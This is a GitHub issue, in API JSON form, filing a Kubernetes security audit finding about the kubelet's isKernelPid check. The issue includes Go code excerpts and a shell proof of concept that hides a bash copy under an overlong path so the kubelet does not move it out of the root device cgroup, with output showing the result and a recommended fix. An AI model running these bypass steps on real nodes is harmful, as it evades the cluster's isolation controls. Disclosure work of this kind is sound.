{
  "active_lock_reason": null,
  "assignee": null,
  "assignees": [],
  "author_association": "MEMBER",
  "body": "This issue was reported in the [Kubernetes Security Audit Report](https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Final%20Report.pdf)\r\n\r\n**Description**\r\nThe isKernelPid function (Figure 1) checks if a given PID is a kernel PID by checking whether readlink of /proc/<pid>/exe returns an error. This check is used to filter out kernel processes and move all other processes that were found in the root device\u2019s cgroup to potentially less privileged manager\u2019s cgroup (Figure 2).\r\n\r\nThe check performed by isKernelPid is too broad. It is possible to create a process that will be filtered as a kernel PID and not moved into potentially less privileged device cgroup.\r\n\r\nA readlink of kernel process\u2019 /proc/<pid>/exe returns an ENOENT error (Figure 3). It is possible to make this operation return another error, for example, by putting the file in a too-long path (Figure 4).\r\n\r\nDespite the fact that the isKernelPid check can be bypassed, it is only invoked on the processes from root (\u201c/\u201d) devices cgroup and only in non-default kubelet configuration. This is when system cgroups name is set and the cgroup root is \u201c/\u201d (Figure 5), which can be set by passing: --system-cgroups=/something --cgroup-root=/ to kubelet arguments.\r\n\r\nExploiting this issue requires the attacker to control a process in the root device cgroup and a privileged user with CAP_SYS_ADMIN capability, which is present by default and must be explicitly dropped to modify the rules for device cgroups. Exploitation is, therefore, unlikely.\r\n\r\n```\r\n// Determines whether the specified PID is a kernel PID.\r\nfunc isKernelPid(pid int) bool {\r\n\t// Kernel threads have no associated executable.\r\n\t_, err := os.Readlink(fmt.Sprintf(\"/proc/%d/exe\", pid))\r\n\treturn err != nil\r\n}\r\n```\r\nFigure 35.1: The isKernelPid function in pkg/kubelet/cm/container_manager_linux.go:869.\r\n\r\n```\r\nfunc ensureSystemCgroups(rootCgroupPath string, manager *fs.Manager) error {\r\n\t// Move non-kernel PIDs to the system container.\r\n\t// (...)\r\n\tfor attemptsRemaining >= 0 {\r\n\t\t// (...)\r\n\t\tallPids, err := cmutil.GetPids(rootCgroupPath)\r\n           // (...)\r\n\t\t// Remove kernel pids and other protected PIDs (pid 1, PIDs already in system & kubelet containers)\r\n\t\tpids := make([]int, 0, len(allPids))\r\n\t\tfor _, pid := range allPids {\r\n\t\t\tif pid == 1 || isKernelPid(pid) {\r\n\t\t\t\tcontinue\r\n\t\t\t}\r\n\r\n\t\t\tpids = append(pids, pid)\r\n\t\t}\r\n\r\n           // (...)\r\n\t\tfor _, pid := range pids {\r\n\t\t\terr := manager.Apply(pid)\r\n\t\t// (...)}\r\n```\r\nFigure 35.2 The ensureSystemCgroups calls isKernelPid to filter out kernel PIDs from processes from \u201c/\u201d devices cgroup (as the rootCgroupPath argument is hardcoded to \u201c/\u201d and cmutils.GetPids gets pids for given devices cgroup) and then moves those non-kernel PIDs to manager\u2019s cgroup.\r\n\r\n```\r\n# ps aux | grep kworker | head -n1\r\nroot     4  0.0  0.0      0     0 ?        I<   09:28   0:00 [kworker/0:0H]\r\n\r\n# strace -e readlink,readlinkat readlink /proc/4/exe\r\nreadlink(\"/proc/4/exe\", 0x55f7adc34100, 64) = -1 ENOENT (No such file or directory)\r\n+++ exited with 1 +++\r\n```\r\nFigure 35.3 Reading link of a kernel process results in ENOENT. Note that we read the link as root, if we did as unprivileged user, we would get EACESS error.\r\n\r\n```\r\n$ cp /bin/bash malicious_bash\r\n$ for i in {1..30}; do mkdir `python -c 'print(\"A\"*250)'` && mv ./malicious_bash ./AA* && cd ./AA*; done\r\n\r\n$ ./malicious_bash\r\n\r\n$ strace -e readlink,readlinkat readlink /proc/$$/exe\r\nreadlink(\"/proc/10089/exe\", 0x563f05b47100, 64) = -1 ENAMETOOLONG (File name too long)\r\n+++ exited with 1 +++\r\n```\r\nFigure 35.4 Making readlink /proc/<pid>/exe return a ENAMETOOLONG error via putting the binary in a too-long path.\r\n\r\n```\r\nif cm.SystemCgroupsName != \"\" {\r\n\tif cm.SystemCgroupsName == \"/\" {\r\n\t\treturn fmt.Errorf(\"system container cannot be root (\\\"/\\\")\")\r\n\t}\r\n\tcont := newSystemCgroups(cm.SystemCgroupsName)\r\n\tcont.ensureStateFunc = func(manager *fs.Manager) error {\r\n\t\treturn ensureSystemCgroups(\"/\", manager)\r\n\t}\r\n\tsystemContainers = append(systemContainers, cont)\r\n}\r\n```\r\nFigure 35.5 ensureSystemCgroups is called only if the systemCgroupsName (--system-cgroups) configuration parameter is not empty (which needs to be specified along with --cgroup-root parameter).\r\n\r\n**Exploit Scenario**\r\nAn example of exploitation can be seen below, where a process spawned in a long path is not moved from the root device cgroup to another device cgroup. The process has been manually moved to the root cgroup via cgclassify, displayed in Figure 6. As a comparison, the standard and expected kubelet behavior is displayed in Figure 7, where the process is properly migrated to a different cgroup.\r\n\r\n```\r\n# cp /bin/bash malicious_bash\r\n\r\n# for i in {1..30}; do mkdir `python -c 'print(\"A\"*250)'` && mv ./malicious_bash ./AA* && cd ./AA*; done\r\n# ./malicious_bash\r\n\r\n# pidof malicious_bash\r\n3682\r\n\r\n# ls -la /proc/$$/exe\r\nls: cannot read symbolic link '/proc/3682/exe': File name too long\r\nlrwxrwxrwx 1 root root 0 Apr 18 13:07 /proc/3682/exe\r\n\r\n# cat /proc/$$/cgroup | grep devices\r\n12:devices:/user.slice\r\n\r\n# cgclassify -g devices:/ $$\r\n\r\n// in the meantime, kubelet has been launched with `--system-cgroups=/user.slice --cgroup-root=/` flags\r\n// by modifying the kubelet code, we could find out it detected those pids as system pids: [1 2 4 6 7 8 9 10 11 12 13 14 15 16 18 19 20 21 22 24 25 26 27 28 30 31 32 33 34 36 37 38 39 40 41 42 43 44 45 46 47 48 49 55 56 57 99 100 101 102 103 104 110 119 136 225 226 228 229 232 234 299 307 348 356 357 425 427 428 429 430 544 2329 2846 2892 2954 3123 3124 3183 3356 3682 8354 10720 10836 15971]\r\n// so the pid of malicious_bash (3682) is there\r\n// and we got such log:\r\n// container_manager_linux.go:887] Found 85 PIDs in root, 85 of them are not to be moved\r\n\r\n# cat /proc/$$/cgroup | grep devices\r\n12:devices:/\r\n```\r\nFigure 35.6 Although kubelet found the attacker controlled process. It didn\u2019t move it to another device cgroup since the process was put in a too-long path to trick the isKernelPid check.\r\n\r\n```\r\n# cat /proc/$$/cgroup | grep devices\r\n12:devices:/user.slice\r\n\r\n# cgclassify -g devices:/ $$\r\n\r\n# cat /proc/$$/cgroup | grep devices\r\n12:devices:/\r\n\r\n// in the meantime, kubelet has been launched with `--system-cgroups=/user.slice --cgroup-root=/` flags\r\n\r\n# cat /proc/$$/cgroup | grep devices\r\n12:devices:/user.slice\r\n```\r\nFigure 35.7 The standard behavior of kubelet moving the non-kernel system processes (the ones from root device cgroup) to the other cgroup.\r\n\r\n**Recommendation**\r\nisKernelPid should explicitly check the error returned from os.Readlink and return true only if the error value isENOENT.\r\n\r\n**Anything else we need to know?**:\r\n\r\nSee #81146 for current status of all issues created from these findings.\r\n\r\nThe vendor gave this issue an ID of TOB-K8S-027 and it was finding 36 of the report.\r\n\r\nThe vendor considers this issue Informational Severity.\r\n\r\nTo view the original finding, begin on page 85 of the [Kubernetes Security Review Report](https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Final%20Report.pdf)\r\n\r\n**Environment**:\r\n\r\n- Kubernetes version: 1.13.4",
  "closed_at": "2019-08-09T00:58:06Z",
  "closed_by": {
    "avatar_url": "https://avatars0.githubusercontent.com/u/20407524?v=4",
    "events_url": "https://api.github.com/users/k8s-ci-robot/events{/privacy}",
    "followers_url": "https://api.github.com/users/k8s-ci-robot/followers",
    "following_url": "https://api.github.com/users/k8s-ci-robot/following{/other_user}",
    "gists_url": "https://api.github.com/users/k8s-ci-robot/gists{/gist_id}",
    "gravatar_id": "",
    "html_url": "https://github.com/k8s-ci-robot",
    "id": 20407524,
    "login": "k8s-ci-robot",
    "node_id": "MDQ6VXNlcjIwNDA3NTI0",
    "organizations_url": "https://api.github.com/users/k8s-ci-robot/orgs",
    "received_events_url": "https://api.github.com/users/k8s-ci-robot/received_events",
    "repos_url": "https://api.github.com/users/k8s-ci-robot/repos",
    "site_admin": false,
    "starred_url": "https://api.github.com/users/k8s-ci-robot/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/k8s-ci-robot/subscriptions",
    "type": "User",
    "url": "https://api.github.com/users/k8s-ci-robot"
  },
  "comments": 1,
  "comments_url": "https://api.github.com/repos/kubernetes/kubernetes/issues/81144/comments",
  "created_at": "2019-08-08T02:04:46Z",
  "events_url": "https://api.github.com/repos/kubernetes/kubernetes/issues/81144/events",
  "html_url": "https://github.com/kubernetes/kubernetes/issues/81144",
  "id": 478214237,
  "labels": [
    {
      "color": "d93f0b",
      "default": false,
      "description": null,
      "id": 116712923,
      "name": "area/security",
      "node_id": "MDU6TGFiZWwxMTY3MTI5MjM=",
      "url": "https://api.github.com/repos/kubernetes/kubernetes/labels/area/security"
    },
    {
      "color": "e11d21",
      "default": false,
      "description": "Categorizes issue or PR as related to a bug.",
      "id": 105146071,
      "name": "kind/bug",
      "node_id": "MDU6TGFiZWwxMDUxNDYwNzE=",
      "url": "https://api.github.com/repos/kubernetes/kubernetes/labels/kind/bug"
    },
    {
      "color": "fbca04",
      "default": false,
      "description": "Higher priority than priority/awaiting-more-evidence.",
      "id": 114528273,
      "name": "priority/backlog",
      "node_id": "MDU6TGFiZWwxMTQ1MjgyNzM=",
      "url": "https://api.github.com/repos/kubernetes/kubernetes/labels/priority/backlog"
    },
    {
      "color": "d2b48c",
      "default": false,
      "description": "Categorizes an issue or PR as relevant to SIG Node.",
      "id": 173493665,
      "name": "sig/node",
      "node_id": "MDU6TGFiZWwxNzM0OTM2NjU=",
      "url": "https://api.github.com/repos/kubernetes/kubernetes/labels/sig/node"
    },
    {
      "color": "d2b48c",
      "default": false,
      "description": "Categorizes an issue or PR as relevant to WG Security Audit.",
      "id": 1086787146,
      "name": "wg/security-audit",
      "node_id": "MDU6TGFiZWwxMDg2Nzg3MTQ2",
      "url": "https://api.github.com/repos/kubernetes/kubernetes/labels/wg/security-audit"
    }
  ],
  "labels_url": "https://api.github.com/repos/kubernetes/kubernetes/issues/81144/labels{/name}",
  "locked": false,
  "milestone": {
    "closed_at": null,
    "closed_issues": 1361,
    "created_at": "2019-01-31T15:17:37Z",
    "creator": {
      "avatar_url": "https://avatars0.githubusercontent.com/u/980082?v=4",
      "events_url": "https://api.github.com/users/liggitt/events{/privacy}",
      "followers_url": "https://api.github.com/users/liggitt/followers",
      "following_url": "https://api.github.com/users/liggitt/following{/other_user}",
      "gists_url": "https://api.github.com/users/liggitt/gists{/gist_id}",
      "gravatar_id": "",
      "html_url": "https://github.com/liggitt",
      "id": 980082,
      "login": "liggitt",
      "node_id": "MDQ6VXNlcjk4MDA4Mg==",
      "organizations_url": "https://api.github.com/users/liggitt/orgs",
      "received_events_url": "https://api.github.com/users/liggitt/received_events",
      "repos_url": "https://api.github.com/users/liggitt/repos",
      "site_admin": false,
      "starred_url": "https://api.github.com/users/liggitt/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/liggitt/subscriptions",
      "type": "User",
      "url": "https://api.github.com/users/liggitt"
    },
    "description": null,
    "due_on": null,
    "html_url": "https://github.com/kubernetes/kubernetes/milestone/45",
    "id": 4018466,
    "labels_url": "https://api.github.com/repos/kubernetes/kubernetes/milestones/45/labels",
    "node_id": "MDk6TWlsZXN0b25lNDAxODQ2Ng==",
    "number": 45,
    "open_issues": 0,
    "state": "open",
    "title": "v1.16",
    "updated_at": "2020-10-25T01:09:02Z",
    "url": "https://api.github.com/repos/kubernetes/kubernetes/milestones/45"
  },
  "node_id": "MDU6SXNzdWU0NzgyMTQyMzc=",
  "number": 81144,
  "performed_via_github_app": null,
  "repository_url": "https://api.github.com/repos/kubernetes/kubernetes",
  "state": "closed",
  "title": "TOB-K8S-027: Incorrect isKernelPid check ",
  "updated_at": "2019-08-09T03:19:55Z",
  "url": "https://api.github.com/repos/kubernetes/kubernetes/issues/81144",
  "user": {
    "avatar_url": "https://avatars2.githubusercontent.com/u/419708?v=4",
    "events_url": "https://api.github.com/users/cji/events{/privacy}",
    "followers_url": "https://api.github.com/users/cji/followers",
    "following_url": "https://api.github.com/users/cji/following{/other_user}",
    "gists_url": "https://api.github.com/users/cji/gists{/gist_id}",
    "gravatar_id": "",
    "html_url": "https://github.com/cji",
    "id": 419708,
    "login": "cji",
    "node_id": "MDQ6VXNlcjQxOTcwOA==",
    "organizations_url": "https://api.github.com/users/cji/orgs",
    "received_events_url": "https://api.github.com/users/cji/received_events",
    "repos_url": "https://api.github.com/users/cji/repos",
    "site_admin": false,
    "starred_url": "https://api.github.com/users/cji/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/cji/subscriptions",
    "type": "User",
    "url": "https://api.github.com/users/cji"
  }
}